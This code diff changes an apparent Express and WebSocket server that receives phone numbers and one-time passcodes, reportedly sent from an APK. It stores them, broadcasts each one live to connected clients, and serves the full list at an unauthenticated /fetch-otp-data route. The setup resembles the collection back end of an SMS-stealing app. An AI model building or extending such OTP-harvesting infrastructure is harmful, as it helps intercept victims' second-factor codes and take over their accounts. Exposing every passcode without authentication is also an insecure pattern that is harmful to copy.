@@ -22,35 +22,49 @@ wss.on('connection', (ws) => {
     });
 });
 
-// Route for serving the frontend
-app.use(express.static('public'));
-
-// Route for adding OTPs (used by the APK)
-app.get('/add-otp', (req, res) => {
+// Handle requests for a specific phone number or OTP submission
+app.get('/', (req, res) => {
     const phone = req.query.phone;
     const otp = req.query.otp;
 
-    if (!phone || !otp) {
-        return res.status(400).json({
-            message: 'Phone number and OTP are required',
-            status: 'error',
+    // If both phone and OTP are provided, save the OTP
+    if (phone && otp) {
+        otpData[phone] = otp;
+
+        // Notify all WebSocket clients
+        const message = JSON.stringify({ phone, otp });
+        clients.forEach((ws) => ws.send(message));
+
+        return res.status(200).json({
+            message: `OTP ${otp} received for phone ${phone}`,
+            status: 'success',
         });
     }
 
-    // Save OTP in memory
-    otpData[phone] = otp;
+    // If only the phone is provided, return the latest OTP for that phone
+    if (phone) {
+        const latestOtp = otpData[phone];
+        if (latestOtp) {
+            return res.redirect(`/?phone=${phone}&otp=${latestOtp}`);
+        } else {
+            return res.status(404).json({
+                message: `No OTP found for phone ${phone}`,
+                status: 'error',
+            });
+        }
+    }
 
-    // Notify all WebSocket clients
-    const message = JSON.stringify({ phone, otp });
-    clients.forEach((ws) => ws.send(message));
-
-    res.status(200).json({
-        message: `OTP ${otp} received for phone ${phone}`,
-        status: 'success',
+    // If neither phone nor OTP is provided, return an error
+    return res.status(400).json({
+        message: 'Phone number is required',
+        status: 'error',
     });
 });
 
-// Route for fetching all stored OTPs
+// Serve frontend
+app.use(express.static('public'));
+
+// Fetch all OTP data
 app.get('/fetch-otp-data', (req, res) => {
     res.json(otpData);
 });
